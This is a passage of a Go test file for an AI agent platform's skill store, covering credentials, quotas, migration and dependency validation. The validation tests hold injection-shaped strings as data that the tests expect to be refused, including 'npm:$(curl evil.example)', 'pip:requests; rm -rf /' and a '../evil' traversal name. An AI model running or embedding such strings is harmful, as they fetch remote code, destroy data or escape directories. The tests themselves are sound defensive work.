	if len(idx.Skills) != 1 || len(idx.Skills[0].Settings) != 1 || idx.Skills[0].Settings[0].Key != "MAX_RESULTS" || idx.Skills[0].Settings[0].Default != "10" {
		t.Fatalf("index entry lost settings: %+v", idx.Skills)
	}
}

// Codex skills carry requirements in agents/openai.yaml (D2/R8.1): tools
// and the implicit-invocation policy fold into the manifest at Build.
func TestBuildCodexOpenAIYAML(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "src")
	skill := Tree{
		SkillFile:            File{Data: []byte("---\nname: codex\ndescription: d\n---\nbody")},
		"agents/openai.yaml": File{Data: []byte("dependencies:\n  tools: [shell_exec, web_fetch]\npolicy:\n  allow_implicit_invocation: false\n")},
	}
	if err := os.MkdirAll(filepath.Join(dir, "codex", "agents"), 0755); err != nil {
		t.Fatal(err)
	}
	for path, f := range skill {
		if err := os.WriteFile(filepath.Join(dir, "codex", path), f.Data, 0644); err != nil {
			t.Fatal(err)
		}
	}
	idx, err := Build(filepath.Join(t.TempDir(), "eff"), []Source{{Name: "user", Dir: dir}})
	if err != nil {
		t.Fatal(err)
	}
	e := idx.Skills[0]
	if !slices.Equal(e.Requires.Tools, []string{"shell_exec", "web_fetch"}) {
		t.Fatalf("codex tools not folded: %+v", e.Requires.Tools)
	}
	if !e.Hidden {
		t.Fatal("allow_implicit_invocation:false must hide the skill")
	}
}

// R8.5: a missing hard credential is an eligibility veto; a missing soft
// one is a setup-needed readiness signal — the skill stays invocable.
func TestReadinessCredentials(t *testing.T) {
	user := newStore(t, ScopeUser)
	must := func(name, extra string) {
		tree := Tree{SkillFile: File{Data: []byte("---\nname: " + name + "\ndescription: d\n" + extra + "---\nb")}}
		if _, err := user.Publish(name, tree, IndexMeta{Author: "x"}); err != nil {
			t.Fatal(err)
		}
	}
	must("hard-cred", "requires:\n  credentials:\n    - {name: API_KEY, hard: true}\n")
	must("soft-cred", "requires:\n  credentials: [API_KEY]\n")
	must("stored-cred", "requires:\n  credentials:\n    - {name: API_KEY, hard: true}\n")

	idx, err := Build(filepath.Join(t.TempDir(), "eff"), []Source{{Name: "user", Dir: user.Root()}})
	if err != nil {
		t.Fatal(err)
	}
	idx.ApplyReadiness(Capabilities{
		Platform:   "linux",
		SkillCreds: map[string]map[string]bool{"stored-cred": {"API_KEY": true}},
	})
	by := map[string]Entry{}
	for _, e := range idx.Skills {
		by[e.Name] = e
	}
	if by["hard-cred"].Eligible || !slices.Contains(by["hard-cred"].Missing, "credential:API_KEY") {
		t.Fatalf("missing hard cred must veto: %+v", by["hard-cred"])
	}
	if !by["soft-cred"].Eligible || !slices.Contains(by["soft-cred"].CredsMissing, "API_KEY") {
		t.Fatalf("missing soft cred is setup-needed, not a veto: %+v", by["soft-cred"])
	}
	if !by["stored-cred"].Eligible || len(by["stored-cred"].CredsMissing) != 0 {
		t.Fatalf("stored cred must satisfy: %+v", by["stored-cred"])
	}
}

// R8.2: per-(principal,skill) secrets live under .state/credentials inside
// the owner store — 0600 files the effective view never sees. Names must be
// env-shaped; hub/broker-reserved and malformed names are refused.
func TestSkillStateCredentials(t *testing.T) {
	dir := t.TempDir()
	if err := WriteCredentials(dir, "demo", map[string]string{"API_KEY": "s3cr3t"}); err != nil {
		t.Fatal(err)
	}
	got, err := ReadCredentials(dir, "demo")
	if err != nil || got["API_KEY"] != "s3cr3t" {
		t.Fatalf("roundtrip: %v %v", got, err)
	}
	if _, err := os.Stat(filepath.Join(dir, ".state", "credentials", "demo.json")); err != nil {
		t.Fatalf("credentials file must exist: %v", err)
	}
	if err := WriteCredentials(dir, "demo", map[string]string{"HUB_TOKEN": "x"}); err == nil {
		t.Fatal("reserved names must be refused")
	}
	if err := WriteCredentials(dir, "../evil", map[string]string{"A": "b"}); err == nil {
		t.Fatal("invalid skill name must be refused")
	}
	if got, err := ReadCredentials(dir, "absent"); err != nil || len(got) != 0 {
		t.Fatalf("absent skill must yield empty credentials: %v %v", got, err)
	}
}

// metadata.deps entries validate against the scheme:package shape; anything
// injection-shaped (flags, URLs, shell syntax) is dropped, never executed
// (R7.4).
func TestParseManifestDepsValidation(t *testing.T) {
	body := `---
name: deps
description: "d"
metadata:
  deps:
    - pip:requests>=2,<3
    - npm:left-pad@1.3.0
    - system:ffmpeg
    - "pip:--index-url https://evil.example"
    - "npm:$(curl evil.example)"
    - "pip:requests; rm -rf /"
    - "cargo:ripgrep"
    - "notaspec"
---`
	m, _, err := ParseSkillMD("deps", []byte(body), false)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"pip:requests>=2,<3", "npm:left-pad@1.3.0", "system:ffmpeg"}
	if !slices.Equal(m.Requires.Deps, want) {
		t.Fatalf("deps = %v, want %v", m.Requires.Deps, want)
	}
}

// R7.4: `uv run`/`npx` pin declarations normalize to their scheme with the
// pinned version; unpinned or flag-bearing runner commands are dropped.
func TestDepsUVNpxPins(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "src")
	body := "---\nname: pinned\ndescription: d\nmetadata:\n  deps:\n" +
		"    - uv run --with requests@2.31.0\n" +
		"    - npx -y prettier@3.2.5\n" +
		"    - uv run --with requests\n" +
		"    - npx prettier\n" +
		"    - uv run --with $(evil)\n" +
		"    - uv run --system pip install requests@2\n" +
		"---\nbody"
	if err := os.MkdirAll(filepath.Join(dir, "pinned"), 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "pinned", SkillFile), []byte(body), 0644); err != nil {
		t.Fatal(err)
	}
	idx, err := Build(filepath.Join(t.TempDir(), "eff"), []Source{{Name: "user", Dir: dir}})
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"pip:requests@2.31.0", "npm:prettier@3.2.5"}
	if got := idx.Skills[0].Requires.Deps; !slices.Equal(got, want) {
		t.Fatalf("deps = %v, want %v", got, want)
	}
}

// PEP 723 dependency blocks inside scripts/*.py fold into the entry's
// validated deps — same allowlist, injection-shaped lines dropped (R7.4).
func TestBuildExtractsPEP723Deps(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "src")
	skill := Tree{
		SkillFile: File{Data: []byte("---\nname: demo\ndescription: d\n---\nbody")},
		"scripts/tool.py": File{Data: []byte(`#!/usr/bin/env python3
# /// script
# requires-python = ">=3.11"
# dependencies = [
#   "requests>=2",
#   "click",
#   "$(evil)",
# ]
# ///
import requests
`)},
	}
	if err := os.MkdirAll(filepath.Join(dir, "demo", "scripts"), 0755); err != nil {
		t.Fatal(err)
	}
	for path, f := range skill {
		dest := filepath.Join(dir, "demo", filepath.FromSlash(path))
		if err := os.WriteFile(dest, f.Data, 0644); err != nil {
			t.Fatal(err)
		}
	}
	idx, err := Build(filepath.Join(t.TempDir(), "eff"), []Source{{Name: "user", Dir: dir}})
	if err != nil {
		t.Fatal(err)
	}
	if len(idx.Skills) != 1 {
		t.Fatalf("skills: %+v", idx.Skills)
	}
	want := []string{"pip:requests>=2", "pip:click"}
	if got := idx.Skills[0].Requires.Deps; !slices.Equal(got, want) {
		t.Fatalf("deps = %v, want %v", got, want)
	}
}

// R7.2: the effective view carries no exec bit anywhere — scripts are data;
// execution happens only from a scratch copy inside the cell. (Vacuous on
// Windows, where stat perm bits are synthesized; binding on the Linux
// daemon.)
func TestBuildStripsExecBits(t *testing.T) {
	eff := filepath.Join(t.TempDir(), "eff")
	src := filepath.Join(t.TempDir(), "src")
	if err := os.MkdirAll(filepath.Join(src, "runner", "scripts"), 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(src, "runner", "references"), 0755); err != nil {
		t.Fatal(err)
	}
	files := map[string][]byte{
		"SKILL.md":        []byte("---\nname: runner\ndescription: d\n---\n"),
		"scripts/s.sh":    []byte("#!/bin/sh\nexit 0\n"),
		"references/r.md": []byte("ref\n"),
	}
	for path, data := range files {
		if err := os.WriteFile(filepath.Join(src, "runner", filepath.FromSlash(path)), data, 0755); err != nil {
			t.Fatal(err)
		}
	}
	if _, err := Build(eff, []Source{{Name: "user", Dir: src}}); err != nil {
		t.Fatal(err)
	}
	err := filepath.Walk(eff, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() && info.Mode().Perm()&0111 != 0 {
			return fmt.Errorf("effective view file %s carries exec bits", path)
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	// Cross-platform: the tree Build hands to writeTree must carry no exec
	// flags at all — exec bits are synthesized away on Windows but matter
	// on the Linux daemon the mount serves.
	stripped := noexecTree(Tree{"scripts/s.sh": {Exec: true, Data: []byte("x")}, "SKILL.md": {Data: []byte("m")}})
	for path, f := range stripped {
		if f.Exec {
			t.Fatalf("noexecTree kept exec on %s", path)
		}
	}
}

// TestRevisionAndIndex covers R2.5/R2.11: the content revision covers
// paths, bytes and exec flags; .state/index.json records provenance; a
// rollback restores exec flags; retained revisions are listed.
func TestRevisionAndIndex(t *testing.T) {
	a := Tree{SkillFile: File{Data: []byte("x")}, "scripts/r.sh": File{Data: []byte("s")}}
	b := Tree{SkillFile: File{Data: []byte("x")}, "scripts/r.sh": File{Data: []byte("s"), Exec: true}}
	if Revision(a) == Revision(b) {
		t.Fatal("exec bit must change the revision")
	}
	c := Tree{SkillFile: File{Data: []byte("x")}, "scripts/z.sh": File{Data: []byte("s")}}
	if Revision(a) == Revision(c) {
		t.Fatal("path must change the revision")
	}

	s := newStore(t, ScopeUser)
	withExec := skillTree("v1")
	withExec["scripts/r.sh"] = File{Data: []byte("#!/bin/sh\ns"), Exec: true}
	gitDraft, err := s.CreateDraft("demo", withExec, DraftMeta{Author: "import", Reason: "git install", SessionID: "sess-9"})
	if err != nil {
		t.Fatal(err)
	}
	rev1, err := s.PublishDraft(gitDraft.ID, "operator:qa")
	if err != nil {
		t.Fatal(err)
	}
	idx, err := s.Index()
	if err != nil {
		t.Fatal(err)
	}
	rec, ok := idx.Skills["demo"]
	if !ok || rec.Revision != rev1 || rec.Source != "draft:import" || rec.Author != "operator:qa" || rec.SessionID != "sess-9" {
		t.Fatalf("index record: %+v", rec)
	}

	if _, err := s.Publish("demo", skillTree("v2"), IndexMeta{Author: "u"}); err != nil {
		t.Fatal(err)
	}
	if revs, _ := s.Revisions("demo"); len(revs) == 0 {
		t.Fatal("no retained revisions")
	}
	if back, err := s.Rollback("demo", rev1); err != nil || back != rev1 {
		t.Fatalf("rollback: %q %v", back, err)
	}
	tree, err := s.Tree("demo")
	if err != nil || !tree["scripts/r.sh"].Exec {
		t.Fatalf("rollback lost exec flag: %v", err)
	}
}

// TestQuotas covers R4.5: tree byte cap, SKILL.md byte cap, skills-per-
// owner cap and drafts-per-day cap.
func TestQuotas(t *testing.T) {
	s := newStore(t, ScopeUser)

	treeBytes := skillTree("x")
	for i := 0; i < 9; i++ {
		treeBytes[fmt.Sprintf("big%d.bin", i)] = File{Data: make([]byte, MaxFileBytes)}
	}
	if _, err := s.Publish("demo", treeBytes, IndexMeta{Author: "u"}); !errors.Is(err, ErrQuota) {
		t.Fatalf("tree quota: want ErrQuota, got %v", err)
	}
	skillMD := Tree{SkillFile: File{Data: make([]byte, MaxSkillMDBytes+1)}}
	if _, err := s.Publish("demo", skillMD, IndexMeta{Author: "u"}); !errors.Is(err, ErrQuota) {
		t.Fatalf("SKILL.md quota: want ErrQuota, got %v", err)
	}

	// Skills-per-owner cap — fill with a temp store to keep this fast.
	s2 := newStore(t, ScopeUser)
	for i := 0; i < MaxSkills; i++ {
		dir := filepath.Join(s2.Root(), fmt.Sprintf("s%04d", i))
		if err := os.MkdirAll(dir, 0755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, SkillFile), []byte("x"), 0644); err != nil {
			t.Fatal(err)
		}
	}
	full := skillTree("x")
	full[SkillFile] = File{Data: []byte("---\nname: one-more\ndescription: \"d\"\n---\n")}
	if _, err := s2.Publish("one-more", full, IndexMeta{Author: "u"}); !errors.Is(err, ErrQuota) {
		t.Fatalf("owner quota: want ErrQuota, got %v", err)
	}
	// Updating an existing skill never hits the cap.
	existing := skillTree("x")
	existing[SkillFile] = File{Data: []byte("---\nname: s0000\ndescription: \"d\"\n---\nnew")}
	if _, err := s2.Publish("s0000", existing, IndexMeta{Author: "u"}); err != nil {
		t.Fatalf("update under cap must succeed: %v", err)
	}

	// Drafts-per-day cap.
	for i := 0; i < MaxDraftsPerDay; i++ {
		if _, err := s.CreateDraft("demo", skillTree("x"), DraftMeta{Author: "agent"}); err != nil {
			t.Fatalf("draft %d: %v", i, err)
		}
	}
	if _, err := s.CreateDraft("demo", skillTree("x"), DraftMeta{Author: "agent"}); !errors.Is(err, ErrQuota) {
		t.Fatalf("draft quota: want ErrQuota, got %v", err)
	}
}

// TestStoreBoundary covers R2.3: a symlinked store root is rejected and
// hub-private dot-directories never appear as skills.
func TestStoreBoundary(t *testing.T) {
	base := t.TempDir()
	real := filepath.Join(base, "real")
	link := filepath.Join(base, "link")
	if err := os.MkdirAll(real, 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(real, link); err == nil {
		if _, err := Open(link, ScopeUser); err == nil {
			t.Fatal("symlinked store root must be rejected")
		}
	} else {
		t.Logf("symlink unavailable: %v", err)
	}

	s := newStore(t, ScopeUser)
	for _, hidden := range []string{".publish-tmp", ".drafts", ".state"} {
		dir := filepath.Join(s.Root(), hidden)
		if err := os.MkdirAll(dir, 0755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, SkillFile), []byte("x"), 0644); err != nil {
			t.Fatal(err)
		}
	}
	if names, _ := s.Names(); len(names) != 0 {
		t.Fatalf("hub-private dirs leaked into listing: %v", names)
	}
}

// TestMigrateLegacy covers R2.12: consented registry skills publish into
// the unified store, unrecorded dirs arrive as drafts for owner review,
// revoked skills are skipped, and dry-run changes nothing.
func TestMigrateLegacy(t *testing.T) {
	space := t.TempDir()
	legacy := filepath.Join(space, "hermes", "skills")
	put := func(name, body string) {
		t.Helper()
		dir := filepath.Join(legacy, name)
		if err := os.MkdirAll(dir, 0755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, SkillFile), []byte(body), 0644); err != nil {
			t.Fatal(err)
		}
	}
	put("consented", "---\nname: consented\ndescription: \"d\"\n---\n")
	put("unrecorded", "---\nname: unrecorded\ndescription: \"d\"\n---\n")
	put("revoked", "---\nname: revoked\ndescription: \"d\"\n---\n")
	// The legacy registry lives at <space>/skills/registry.json as
	// {schema, user, skills: [...]}.
	if err := os.MkdirAll(filepath.Join(space, "skills"), 0755); err != nil {
		t.Fatal(err)
	}
	registry := `{"schema":1,"user":"u","skills":[{"name":"consented","consent":true,"scan":"pass"},{"name":"revoked","consent":true,"revoked":true}]}`
	if err := os.WriteFile(filepath.Join(space, "skills", "registry.json"), []byte(registry), 0644); err != nil {
		t.Fatal(err)
	}

	// Dry-run reports without writing.
	rep, err := MigrateLegacySpace(space, false)
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.Published) != 1 || len(rep.Drafted) != 1 || len(rep.Skipped) != 1 {
		t.Fatalf("dry report: %+v", rep)
	}
	if names, _ := mustStore(t, space).Names(); len(names) != 0 {
		t.Fatal("dry-run must not write")
	}

	rep, err = MigrateLegacySpace(space, true)
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.Published) != 1 || len(rep.Drafted) != 1 || len(rep.Skipped) != 1 {
		t.Fatalf("apply report: %+v", rep)
	}
	s := mustStore(t, space)
	if names, _ := s.Names(); len(names) != 1 || names[0] != "consented" {
		t.Fatalf("published: %v", names)
	}
	drafts, err := s.Drafts()
	if err != nil || len(drafts) != 1 || drafts[0].Name != "unrecorded" {
		t.Fatalf("drafted: %v %+v", err, drafts)
	}
	// Idempotent: a second run does not duplicate.
	rep2, err := MigrateLegacySpace(space, true)
	if err != nil {
		t.Fatal(err)
	}
	if len(rep2.Published) != 0 || len(rep2.Drafted) != 0 {
		t.Fatalf("second run must be idempotent: %+v", rep2)
	}
}

func TestMigrateDropsBundledCopies(t *testing.T) {
	space := t.TempDir()
	platform := t.TempDir()
	writeLegacy := func(dir, name, body string) {
		t.Helper()
		if err := os.MkdirAll(dir, 0755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, SkillFile), []byte(body), 0644); err != nil {
			t.Fatal(err)
		}
	}
	body := "---\nname: bundled\ndescription: shipped copy\n---\n"
	writeLegacy(filepath.Join(platform, "bundled"), "bundled", body)
	writeLegacy(filepath.Join(space, "hermes", "skills", "bundled"), "bundled", body)
	writeLegacy(filepath.Join(space, "hermes", "skills", "own"), "own", "---\nname: own\ndescription: user content\n---\n")
	rep, err := MigrateLegacySpaceWithPlatform(space, platform, true)
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Contains(rep.Skipped, "bundled") {
		t.Fatalf("bundled copy must be dropped, not migrated: %+v", rep)
	}
	st := mustStore(t, filepath.Join(space, "skills"))
	if names, _ := st.Names(); slices.Contains(names, "bundled") {
		t.Fatal("bundled copy entered the user store")
	}
}

// TestMigrateLegacyOrg covers the organization tier: content already live via
// /org publishes directly instead of stalling behind drafts (R2.7).
func TestMigrateLegacyOrg(t *testing.T) {
	org := t.TempDir()
	dir := filepath.Join(org, "hermes", "skills", "runbook")
	if err := os.MkdirAll(dir, 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, SkillFile), []byte("---\nname: runbook\ndescription: \"org\"\n---\n"), 0644); err != nil {
		t.Fatal(err)
	}
	rep, err := MigrateLegacyOrg(org, true)
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.Published) != 1 || len(rep.Drafted) != 0 {
		t.Fatalf("org content must publish, not draft: %+v", rep)
	}
	s, err := Open(filepath.Join(org, "skills"), ScopeOrg)
	if err != nil {
		t.Fatal(err)
	}
	if names, _ := s.Names(); len(names) != 1 || names[0] != "runbook" {
		t.Fatalf("org store: %v", names)
	}
}

func mustStore(t *testing.T, space string) *Store {
	t.Helper()
	s, err := Open(filepath.Join(space, "skills"), ScopeUser)
	if err != nil {
		t.Fatal(err)
	}
	return s
}
